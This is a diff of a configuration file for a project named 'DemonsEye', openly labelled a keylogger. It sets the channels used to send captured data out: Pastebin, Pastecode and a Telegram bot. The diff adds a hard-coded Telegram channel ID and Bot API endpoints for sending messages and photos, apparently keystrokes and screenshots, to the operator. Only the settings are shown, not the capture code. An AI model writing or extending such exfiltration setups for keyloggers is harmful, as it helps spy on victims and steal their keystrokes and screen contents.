@@ -25,7 +25,7 @@ SEND_EMAIL_TLS = True                                           # Can be True or
 # paste services ids
 PASTE_PASTEBIN = 1                                              # Pastebin
 PASTE_PASTECODE = 2                                             # Pastecode
-PASTE_TELEGRAM = 3                                              # Telegram Bot
+PASTE_TELEGRAM = 3                                              # Telegram
 
 # Pastebin
 PASTEBIN_ENABLED = True                                         # Enable or disable Pastebin send
@@ -50,12 +50,15 @@ PASTECODE_PRIVATE = 1
 # Info API https://core.telegram.org/bots/api
 # https://api.telegram.org/bot[BOT_API_KEY]/sendMessage?chat_id=[MY_CHANNEL_NAME]&text=[MY_MESSAGE_TEXT]
 TELEGRAM_BOT_ENABLED = True
-TELEGRAM_BOT_NAME = "DemonsEye"
-TELEGRAM_BOT_USERNAME = "DemonsEyebot"
-TELEGRAM_BOT_TOKEN = ""
-TELEGRAM_BOT_POST_URL = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + \
-                        '/sendMessage?chat_id=' + TELEGRAM_BOT_NAME
-
+TELEGRAM_BOT_NAME = 'DemonsEye'
+TELEGRAM_BOT_USERNAME = '@DemonsEyeKeylogger'
+TELEGRAM_BOT_CHANNELID = -1001185988695
+TELEGRAM_BOT_TOKEN = ''
+TELEGRAM_BOT_URL = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/'
+TELEGRAM_BOT_GETME = 'getMe'
+TELEGRAM_BOT_UPDATES = 'getUpdates'
+TELEGRAM_BOT_SEND = 'sendMessage'
+TELEGRAM_BOT_SENDPHOTO = 'sendPhoto'
 
 # Twitter - pending
 TWITTER_USERNAME = ""
